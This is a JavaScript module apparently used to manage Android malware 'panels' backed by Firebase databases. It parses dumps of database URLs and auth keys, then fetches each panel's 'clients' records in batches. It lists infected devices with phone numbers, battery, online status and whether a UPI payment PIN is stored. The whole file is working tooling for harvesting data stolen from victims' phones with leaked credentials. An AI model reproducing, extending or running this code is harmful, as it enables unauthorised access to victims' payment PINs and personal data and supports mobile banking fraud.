/** Firebase RTDB panel helpers (APK index.html jaisa core) */

const URL_IN_TEXT =
  /(?:Firebase:\s*-?\s*)?(https?:\/\/[^\s,'"<>]+(?:firebaseio\.com|firebasedatabase\.app)[^\s,'"<>]*)/gi;

export function normalizeFirebaseUrl(url) {
  if (!url) return '';
  url = String(url).trim();
  url = url.replace(/^Firebase:\s*-?\s*/i, '');
  url = url.replace(/^[<\[(]+|[>\])\s"']+$/g, '');
  const m = url.match(
    /^(https?:\/\/[^\s,'"<>]+(?:firebaseio\.com|firebasedatabase\.app))[^\s,'"<>]*/i
  );
  if (m) url = m[1];
  url = url.replace(/-+(?:\s*)$/g, '');
  url = url.replace(/(\.(?:com|app))-+$/i, '$1');
  url = url.replace(/[",\]\)]+$/, '').replace(/\/$/, '');
  if (!/^https?:\/\//i.test(url)) url = 'https://' + url.replace(/^\/+/, '');
  return url;
}

export function isFirebaseDbUrl(url) {
  return /firebaseio\.com|firebasedatabase\.app/i.test(url || '');
}

function keyScore(key) {
  if (!key) return 0;
  if (/firebaseio|firebasedatabase|https?:\/\//i.test(key)) return -1;
  if (/^AIzaSy/i.test(key)) return 2;
  if (key.length >= 20) return 4;
  if (key.length >= 8) return 3;
  if (key.length >= 3) return 1;
  return 0;
}

function cleanAuthKey(raw) {
  let key = String(raw || '').trim();
  key = key.replace(/^['"]|['"]$/g, '');
  if (!key) return '';
  if (/firebaseio|firebasedatabase/i.test(key)) return '';
  if (/^https?:\/\//i.test(key)) return '';
  if (key.toLowerCase() === 'null' || key === '—') return '';
  return key;
}

export function parseTxtCredentials(content) {
  const map = new Map();
  const text = String(content || '');
  const lines = text.split(/\r?\n/);

  const register = (rawUrl, rawKey) => {
    const url = normalizeFirebaseUrl(rawUrl);
    if (!url || !isFirebaseDbUrl(url)) return;
    const key = cleanAuthKey(rawKey);
    const k = url.toLowerCase();
    const entry = { url, key: key || '', name: panelName(url) };
    const prev = map.get(k);
    if (!prev) {
      map.set(k, entry);
      return;
    }
    if (keyScore(key) > keyScore(prev.key)) {
      map.set(k, { ...entry, key });
    }
  };

  let pendingUrl = '';
  for (let i = 0; i < lines.length; i++) {
    const t = lines[i].trim();
    if (!t) continue;

    const urlLine = t.match(
      /(?:📍\s*)?(?:Firebase\s*)?URL\s*:\s*(.+)$/i
    )?.[1];
    if (urlLine && /firebaseio|firebasedatabase/i.test(urlLine)) {
      pendingUrl = normalizeFirebaseUrl(urlLine);
      register(pendingUrl, '');
      continue;
    }

    const keyLine = t.match(/🔑\s*Auth\s*Key\s*:\s*(.+)$/i)?.[1];
    if (keyLine && pendingUrl) {
      register(pendingUrl, keyLine);
      pendingUrl = '';
      continue;
    }

    const authInline = t.match(
      /(?:auth\s*key|secret|database\s*secret)\s*[:=]\s*['"]?([^'"\s]+)/i
    );
    if (authInline && pendingUrl) {
      register(pendingUrl, authInline[1]);
    }
  }

  let pm;
  URL_IN_TEXT.lastIndex = 0;
  while ((pm = URL_IN_TEXT.exec(text)) !== null) {
    register(pm[1], '');
  }

  const pairRe =
    /(https?:\/\/[^\s,'"<>]+(?:firebaseio\.com|firebasedatabase\.app)[^\s,'"<>]*)\s*[,|;\t]\s*([A-Za-z0-9_\-./+=]{3,})/gi;
  while ((pm = pairRe.exec(text)) !== null) {
    register(pm[1], pm[2]);
  }

  for (let i = 0; i < lines.length; i++) {
    const t = lines[i].trim();
    if (!t || t.startsWith('#')) continue;
    const urlMatch = t.match(URL_IN_TEXT);
    if (!urlMatch) continue;
    const url = normalizeFirebaseUrl(urlMatch[0].replace(/^Firebase:\s*-?\s*/i, ''));
    let key = t.match(/(?:auth\s*key|secret|key)\s*[:=]\s*['"]?([^\s'"]+)/i)?.[1];
    if (!key) {
      for (let j = i + 1; j < Math.min(i + 6, lines.length); j++) {
        const n = lines[j].trim();
        if (/URL\s*:|firebaseio|firebasedatabase/i.test(n) && j > i + 1) break;
        const km = n.match(/🔑\s*Auth\s*Key\s*:\s*(.+)$/i);
        if (km) {
          key = km[1];
          break;
        }
        if (/^[A-Za-z0-9_\-./+=]{8,}$/.test(n) && !/firebase/i.test(n)) {
          key = n;
          break;
        }
      }
    }
    register(url, key || '');
  }

  return [...map.values()].sort((a, b) => a.url.localeCompare(b.url));
}

export function panelName(url) {
  try {
    return url.split('//')[1].split('-default')[0].split('.')[0];
  } catch {
    return 'panel';
  }
}

export async function firebaseGet(baseUrl, key, path, ms = 12000) {
  const url = normalizeFirebaseUrl(baseUrl);
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), ms);
  const qs = key?.trim()
    ? `?${new URLSearchParams({ auth: key.trim() })}`
    : '?auth=';
  try {
    const res = await fetch(`${url}/${path}.json${qs}`, {
      signal: ctrl.signal,
      headers: { Accept: 'application/json' },
    });
    clearTimeout(timer);
    if (res.status === 404) return null;
    if (res.status === 401 || res.status === 423) return null;
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    if (data && typeof data === 'object' && data.error) return null;
    return data;
  } catch (e) {
    clearTimeout(timer);
    throw e;
  }
}

export function parseDevices(data, panelUrl, panelKey, panelName) {
  if (!data || typeof data !== 'object') return [];
  return Object.entries(data)
    .map(([id, d]) => {
      if (!d || typeof d !== 'object') return null;
      const pin = d.upipin ?? d.upiPin;
      const hasPin = pin != null && String(pin).trim().length >= 4;
      return {
        id,
        panelUrl,
        panelKey: panelKey || '',
        panelName,
        name: d.modelName || d.deviceName || d.model || d.name || id,
        status: !!d.status,
        battery: d.battery,
        hasPin,
        phone: d.mobNo || d.phone || d.mobile || '—',
      };
    })
    .filter(Boolean);
}

export async function fetchPanelDevices(panel) {
  const clients = await firebaseGet(panel.url, panel.key, 'clients');
  if (!clients) return [];
  return parseDevices(clients, panel.url, panel.key, panel.name);
}

export async function fetchAllPanels(panels, { batch = 10, onProgress } = {}) {
  const all = [];
  let done = 0;
  for (let i = 0; i < panels.length; i += batch) {
    const chunk = panels.slice(i, i + batch);
    const results = await Promise.allSettled(chunk.map(fetchPanelDevices));
    for (const r of results) {
      done++;
      if (r.status === 'fulfilled') all.push(...r.value);
      if (onProgress) onProgress(done, panels.length, all.length);
    }
  }
  return all;
}
